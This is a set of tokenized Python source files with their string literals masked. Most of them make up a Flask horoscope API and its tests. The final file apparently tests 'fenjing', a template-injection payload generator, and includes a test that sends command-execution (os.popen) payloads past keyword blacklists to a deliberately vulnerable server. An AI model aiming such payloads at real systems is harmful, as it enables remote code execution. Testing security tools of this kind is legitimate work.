<s> from flask import Flask <EOL> from app . controllers . horoscope_ctr_get import horoscope_blueprint_get <EOL> from app . controllers . horoscope_ctr_home import horoscope_blueprint_home <EOL> from app . controllers . horoscope_ctr_post import horoscope_blueprint_post <EOL> from app . utils . config_docs import config_docs <EOL> def create_app ( ) : <EOL> app = Flask ( __name__ , static_folder = '<STR_LIT>' , static_url_path = '<STR_LIT>' ) <EOL> app . register_blueprint ( horoscope_blueprint_post ) <EOL> app . register_blueprint ( horoscope_blueprint_get ) <EOL> app . register_blueprint ( horoscope_blueprint_home ) <EOL> config_docs ( app ) <EOL> return app <EOL> </s>
<s> from flask import Blueprint , jsonify , request <EOL> from app . repositories . horoscope_repository import HoroscopeRepository <EOL> from app . services . horoscope_service import HoroscopeService <EOL> from app . utils . status_code import Status <EOL> from app . utils . signs import SIGNS <EOL> horoscope_blueprint_get = Blueprint ( '<STR_LIT>' , __name__ ) <EOL> @ horoscope_blueprint_get . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def get_horoscope ( sign = None ) : <EOL> date = request . args . get ( '<STR_LIT>' , None ) <EOL> lang = request . args . get ( '<STR_LIT>' , None ) <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> try : <EOL> horoscope = service . get_horoscope_info ( sign , date , lang ) <EOL> url = f"<STR_LIT>" <EOL> horoscope . icon = horoscope . icon . format ( path = f"<STR_LIT>" ) <EOL> return jsonify ( horoscope . __dict__ ) , Status . HTTP_OK <EOL> except ValueError as e : <EOL> return jsonify ( { '<STR_LIT>' : e . args [ <NUM_LIT> ] } ) , Status . HTTP_BAD_REQUEST <EOL> except Exception as e : <EOL> return jsonify ( { '<STR_LIT>' : e . args [ <NUM_LIT> ] } ) , Status . HTTP_INTERNAL_SERVER_ERROR <EOL> @ horoscope_blueprint_get . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def get_horoscope_list ( ) : <EOL> url = f"<STR_LIT>" <EOL> list_sign = list ( map ( lambda sign : { ** sign , "<STR_LIT>" : sign [ "<STR_LIT>" ] . format ( path = f"<STR_LIT>" ) } , SIGNS . values ( ) ) ) <EOL> return jsonify ( list_sign ) , Status . HTTP_OK <EOL> </s>
<s> from flask import Flask <EOL> from app import create_app <EOL> app = create_app ( ) <EOL> </s>
<s> SIGNS = { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> } <EOL> def get_id_from_sign ( sign : str ) -> int : <EOL> if not sign : <EOL> return <NUM_LIT> , SIGNS [ '<STR_LIT>' ] <EOL> sign = sign . lower ( ) <EOL> if sign in SIGNS : <EOL> index = SIGNS [ sign ] [ '<STR_LIT>' ] <EOL> return index , SIGNS [ sign ] <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> </s>
<s> from flask import Flask <EOL> from flasgger import Swagger <EOL> def config_docs ( app : Flask ) : <EOL> swagger = Swagger ( <EOL> app , <EOL> template = { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : [ <EOL> "<STR_LIT>" <EOL> ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : [ <EOL> { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> ] , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> } <EOL> } <EOL> ) <EOL> </s>
<s> import json <EOL> import pytest <EOL> from flask import Flask <EOL> from flask . testing import FlaskClient <EOL> from app . controllers . horoscope_ctr_post import horoscope_blueprint_post <EOL> from app . services . horoscope_service import HoroscopeService <EOL> from app . utils . status_code import Status <EOL> @ pytest . fixture <EOL> def app ( ) : <EOL> app = Flask ( __name__ ) <EOL> app . register_blueprint ( horoscope_blueprint_post ) <EOL> return app <EOL> @ pytest . fixture <EOL> def client ( app ) : <EOL> return app . test_client ( ) <EOL> def test_post_horoscope ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_post_horoscope_when_date_is_future ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_post_horoscope_when_date_is_past ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> def test_post_horoscope_when_date_is_invalid ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_post_horoscope_when_lang_is_invalid ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_post_horoscope_when_sign_is_invalid ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_post_horoscope_when_sign_is_empty ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> def test_post_horoscope_when_sign_is_none ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : None , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . post ( '<STR_LIT>' , json = data ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> </s>
<s> import json <EOL> import pytest <EOL> from flask import Flask <EOL> from flask . testing import FlaskClient <EOL> from app . controllers . horoscope_ctr_get import horoscope_blueprint_get <EOL> from app . services . horoscope_service import HoroscopeService <EOL> from app . utils . status_code import Status <EOL> @ pytest . fixture <EOL> def app ( ) : <EOL> app = Flask ( __name__ ) <EOL> app . register_blueprint ( horoscope_blueprint_get ) <EOL> return app <EOL> @ pytest . fixture <EOL> def client ( app ) : <EOL> return app . test_client ( ) <EOL> def test_get_horoscope ( client ) : <EOL> response = client . get ( '<STR_LIT>' ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_get_horoscope_when_date_is_future ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . get ( f"<STR_LIT>" , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_get_horoscope_when_date_is_past ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . get ( f"<STR_LIT>" , json = data ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> def test_get_horoscope_when_date_is_invalid ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . get ( f"<STR_LIT>" , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_get_horoscope_when_lang_is_invalid ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . get ( f"<STR_LIT>" , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_get_horoscope_when_sign_is_invalid ( client ) : <EOL> data = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> response = client . get ( f"<STR_LIT>" , json = data ) <EOL> assert response . status_code == Status . HTTP_BAD_REQUEST <EOL> assert '<STR_LIT>' in json . loads ( response . get_data ( as_text = True ) ) <EOL> def test_get_horoscope_list ( client ) : <EOL> response = client . get ( '<STR_LIT>' ) <EOL> print ( response . text ) <EOL> assert response . status_code == Status . HTTP_OK <EOL> </s>
<s> class Horoscope : <EOL> def __init__ ( self , sign , date , horoscope , icon , id ) : <EOL> self . sign = sign <EOL> self . date = date <EOL> self . horoscope = horoscope <EOL> self . icon = icon <EOL> self . id = id <EOL> </s>
<s> class SignError : <EOL> def __init__ ( self , msg ) : <EOL> self . msg = msg <EOL> </s>
<s> import pytest <EOL> from app . repositories . horoscope_repository import HoroscopeRepository <EOL> class TestHoroscopeRepository : <EOL> @ pytest . fixture <EOL> def horoscope_repository ( self ) : <EOL> return HoroscopeRepository ( ) <EOL> def test_get_horoscope_info_without_date ( self , horoscope_repository ) : <EOL> sign = <NUM_LIT> <EOL> result = horoscope_repository . get_horoscope_info ( sign , None , None ) <EOL> assert result is not None <EOL> assert isinstance ( result , str ) <EOL> def test_get_horoscope_info_with_date ( self , horoscope_repository ) : <EOL> sign = <NUM_LIT> <EOL> date = "<STR_LIT>" <EOL> result = horoscope_repository . get_horoscope_info ( sign , date , None ) <EOL> assert result is not None <EOL> assert isinstance ( result , str ) <EOL> def test_get_horoscope_info_with_invalid_date ( self , horoscope_repository ) : <EOL> sign = <NUM_LIT> <EOL> date = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) : <EOL> horoscope_repository . get_horoscope_info ( sign , date , None ) <EOL> def test_get_horoscope_info_with_nonexistent_sign ( self , horoscope_repository ) : <EOL> sign = <NUM_LIT> <EOL> with pytest . raises ( Exception ) : <EOL> horoscope_repository . get_horoscope_info ( sign , None , None ) <EOL> def test_get_horoscope_info_with_invalid_lang ( self , horoscope_repository ) : <EOL> sign = <NUM_LIT> <EOL> lang = "<STR_LIT>" <EOL> with pytest . raises ( Exception ) : <EOL> horoscope_repository . get_horoscope_info ( sign , None , lang ) <EOL> </s>
<s> from app . utils . translate import text_translate <EOL> import pytest <EOL> def test_text_translate_valid_country_code ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = "<STR_LIT>" <EOL> translated_text = text_translate ( content , target_lang ) <EOL> assert isinstance ( translated_text , str ) <EOL> assert len ( translated_text ) > <NUM_LIT> <EOL> def test_text_translate_invalid_country_code ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) : <EOL> text_translate ( content , target_lang ) <EOL> def test_text_translate_empty_content ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = "<STR_LIT>" <EOL> translated_text = text_translate ( content , target_lang ) <EOL> assert isinstance ( translated_text , str ) <EOL> assert len ( translated_text ) == <NUM_LIT> <EOL> def test_text_translate_valid_input ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = '<STR_LIT>' <EOL> translated_text = text_translate ( content , target_lang ) <EOL> assert isinstance ( translated_text , str ) <EOL> assert translated_text != "<STR_LIT>" <EOL> def test_text_translate_empty_input ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = '<STR_LIT>' <EOL> translated_text = text_translate ( content , target_lang ) <EOL> assert isinstance ( translated_text , str ) <EOL> assert translated_text == "<STR_LIT>" <EOL> def test_text_translate_long_text ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = '<STR_LIT>' <EOL> with pytest . raises ( ValueError ) as e : <EOL> text_translate ( content , target_lang ) <EOL> assert "<STR_LIT>" in str ( e . value ) <EOL> def test_text_translate_invalid_country_code ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = '<STR_LIT>' <EOL> with pytest . raises ( ValueError ) as e : <EOL> text_translate ( content , target_lang ) <EOL> assert "<STR_LIT>" in str ( e . value ) <EOL> def test_text_translate_short_country_code ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = '<STR_LIT>' <EOL> with pytest . raises ( ValueError ) as e : <EOL> text_translate ( content , target_lang ) <EOL> assert "<STR_LIT>" in str ( e . value ) <EOL> def test_text_translate_long_country_code ( ) : <EOL> content = "<STR_LIT>" <EOL> target_lang = '<STR_LIT>' <EOL> with pytest . raises ( ValueError ) as e : <EOL> text_translate ( content , target_lang ) <EOL> assert "<STR_LIT>" in str ( e . value ) <EOL> </s>
<s> from datetime import datetime <EOL> import pytest <EOL> from app . models . horoscope import Horoscope <EOL> from app . repositories . horoscope_repository import HoroscopeRepository <EOL> from app . services . horoscope_service import HoroscopeService <EOL> def test_get_horoscope_info_with_valid_sign_and_date_and_lang ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> date = "<STR_LIT>" <EOL> lang = "<STR_LIT>" <EOL> result = service . get_horoscope_info ( sign , date , lang ) <EOL> assert isinstance ( result , Horoscope ) <EOL> assert result . sign == sign <EOL> assert result . date == date <EOL> def test_get_horoscope_info_with_valid_sign_without_date_and_lang ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> result = service . get_horoscope_info ( sign ) <EOL> assert isinstance ( result , Horoscope ) <EOL> assert result . sign == sign <EOL> assert result . date == datetime . now ( ) . strftime ( "<STR_LIT>" ) <EOL> def test_get_horoscope_info_with_invalid_sign ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) as excinfo : <EOL> service . get_horoscope_info ( sign ) <EOL> assert "<STR_LIT>" in str ( excinfo . value ) <EOL> def test_get_horoscope_info_with_invalid_date ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> date = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) as excinfo : <EOL> service . get_horoscope_info ( sign , date ) <EOL> assert "<STR_LIT>" in str ( excinfo . value ) <EOL> def test_get_horoscope_info_with_future_date ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> date = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) as excinfo : <EOL> service . get_horoscope_info ( sign , date ) <EOL> assert "<STR_LIT>" in str ( excinfo . value ) <EOL> def test_get_horoscope_info_with_invalid_lang ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> lang = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) as excinfo : <EOL> service . get_horoscope_info ( sign , lang = lang ) <EOL> assert "<STR_LIT>" in str ( excinfo . value ) <EOL> def test_get_horoscope_info_with_invalid_lang ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> lang = "<STR_LIT>" <EOL> with pytest . raises ( ValueError ) as excinfo : <EOL> service . get_horoscope_info ( sign , lang = lang ) <EOL> assert "<STR_LIT>" in str ( excinfo . value ) <EOL> def test_get_horoscope_info_with_none_date ( ) : <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> sign = "<STR_LIT>" <EOL> result = service . get_horoscope_info ( sign , date = None ) <EOL> assert isinstance ( result , Horoscope ) <EOL> assert result . sign == sign <EOL> assert result . date == datetime . now ( ) . strftime ( "<STR_LIT>" ) <EOL> </s>
<s> from app . utils . signs import SIGNS , get_id_from_sign <EOL> from app . models . horoscope import Horoscope <EOL> from datetime import datetime <EOL> class HoroscopeService : <EOL> def __init__ ( self , horoscope_repository ) : <EOL> self . horoscope_repository = horoscope_repository <EOL> def get_horoscope_info ( self , sign , date = None , lang = None ) : <EOL> if date : <EOL> current_date = datetime . now ( ) . date ( ) <EOL> if datetime . strptime ( date , "<STR_LIT>" ) . date ( ) > current_date : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> id , sing_extra_info = get_id_from_sign ( sign ) <EOL> content = self . horoscope_repository . get_horoscope_info ( id , date , lang ) <EOL> if not date : <EOL> date = datetime . now ( ) . strftime ( "<STR_LIT>" ) <EOL> return Horoscope ( <EOL> sign = sing_extra_info [ '<STR_LIT>' ] , <EOL> horoscope = content , <EOL> date = date , <EOL> icon = sing_extra_info [ '<STR_LIT>' ] , <EOL> id = id <EOL> ) <EOL> </s>
<s> from flask import Blueprint , jsonify , request <EOL> from app . repositories . horoscope_repository import HoroscopeRepository <EOL> from app . services . horoscope_service import HoroscopeService <EOL> from app . utils . status_code import Status <EOL> horoscope_blueprint_post = Blueprint ( '<STR_LIT>' , __name__ ) <EOL> @ horoscope_blueprint_post . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def post_horoscope ( ) : <EOL> sign = request . json . get ( '<STR_LIT>' , None ) <EOL> date = request . json . get ( '<STR_LIT>' , None ) <EOL> lang = request . json . get ( '<STR_LIT>' , None ) <EOL> horoscope_repository = HoroscopeRepository ( ) <EOL> service = HoroscopeService ( horoscope_repository ) <EOL> try : <EOL> horoscope = service . get_horoscope_info ( sign , date , lang ) <EOL> url = f"<STR_LIT>" <EOL> horoscope . icon = horoscope . icon . format ( path = f"<STR_LIT>" ) <EOL> return jsonify ( horoscope . __dict__ ) , Status . HTTP_OK <EOL> except ValueError as e : <EOL> return jsonify ( { '<STR_LIT>' : e . args [ <NUM_LIT> ] } ) , Status . HTTP_BAD_REQUEST <EOL> except Exception as e : <EOL> return jsonify ( { '<STR_LIT>' : e . args [ <NUM_LIT> ] } ) , Status . HTTP_INTERNAL_SERVER_ERROR <EOL> </s>
<s> from flask import Blueprint , render_template <EOL> horoscope_blueprint_home = Blueprint ( <EOL> '<STR_LIT>' , <EOL> __name__ , <EOL> template_folder = '<STR_LIT>' , <EOL> ) <EOL> @ horoscope_blueprint_home . get ( '<STR_LIT>' ) <EOL> def home ( ) : <EOL> return render_template ( '<STR_LIT>' ) <EOL> </s>
<s> import pytest <EOL> from app . utils . signs import SIGNS , get_id_from_sign <EOL> def test_get_month_from_sign_valid_sign ( ) : <EOL> sign = '<STR_LIT>' <EOL> expected_month = <NUM_LIT> <EOL> expected_result = ( expected_month , SIGNS [ sign ] ) <EOL> assert get_id_from_sign ( sign ) == expected_result <EOL> def test_get_month_from_sign_empty_sign ( ) : <EOL> sign = '<STR_LIT>' <EOL> expected_month = <NUM_LIT> <EOL> expected_result = ( expected_month , SIGNS [ '<STR_LIT>' ] ) <EOL> assert get_id_from_sign ( sign ) == expected_result <EOL> def test_get_month_from_sign_invalid_sign ( ) : <EOL> sign = '<STR_LIT>' <EOL> with pytest . raises ( ValueError ) : <EOL> get_id_from_sign ( sign ) <EOL> </s>
<s> import sys <EOL> sys . path . append ( "<STR_LIT>" ) <EOL> from fenjing . form import get_form <EOL> from fenjing . requester import HTTPRequester <EOL> from fenjing . submitter import FormSubmitter <EOL> import fenjing <EOL> import logging <EOL> import os <EOL> from fenjing import FullPayloadGen , const , options <EOL> import unittest <EOL> import random <EOL> import jinja2 <EOL> fenjing . full_payload_gen . logger . setLevel ( logging . ERROR ) <EOL> fenjing . payload_gen . logger . setLevel ( logging . ERROR ) <EOL> VULUNSERVER_ADDR = os . environ . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> def get_full_payload_gen ( <EOL> blacklist , <EOL> detect_mode = fenjing . const . DetectMode . ACCURATE , <EOL> environment = fenjing . const . TemplateEnvironment . FLASK , <EOL> ) : <EOL> return FullPayloadGen ( <EOL> lambda x : all ( word not in x for word in blacklist ) , <EOL> options = options . Options ( detect_mode = detect_mode , environment = environment ) , <EOL> ) <EOL> class FullPayloadGenTestCaseSimple ( unittest . TestCase ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> self . subm = FormSubmitter ( <EOL> url = VULUNSERVER_ADDR , <EOL> form = get_form ( action = "<STR_LIT>" , inputs = [ "<STR_LIT>" ] , method = "<STR_LIT>" ) , <EOL> target_field = "<STR_LIT>" , <EOL> requester = HTTPRequester ( interval = <NUM_LIT> ) , <EOL> ) <EOL> def test_string ( self ) : <EOL> strings = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for string in strings : <EOL> payload , _ = self . full_payload_gen . generate ( const . STRING , string ) <EOL> assert payload is not None <EOL> resp = self . subm . submit ( payload ) <EOL> assert resp is not None <EOL> self . assertIn ( string , resp . text ) <EOL> for word in self . blacklist : <EOL> self . assertNotIn ( word , payload ) <EOL> def test_os_popen_read ( self ) : <EOL> payload , _ = self . full_payload_gen . generate ( <EOL> const . OS_POPEN_READ , "<STR_LIT>" <EOL> ) <EOL> assert payload is not None <EOL> resp = self . subm . submit ( payload ) <EOL> assert resp is not None <EOL> self . assertIn ( "<STR_LIT>" , resp . text ) <EOL> for word in self . blacklist : <EOL> self . assertNotIn ( word , payload ) <EOL> class FullPayloadGenTestCaseHard ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> class FullPayloadGenTestCaseHard2 ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> class FullPayloadGenTestCaseStringFormat1 ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> self . full_payload_gen = get_full_payload_gen ( self . blacklist ) <EOL> class FullPayloadGenTestCaseStringFormat2 ( FullPayloadGenTestCaseSimple ) : <EOL> def setUp ( self ) -> None : <EOL> super ( ) . setUp ( ) <EOL> self . blacklist = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> '<STR_LIT>' , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , 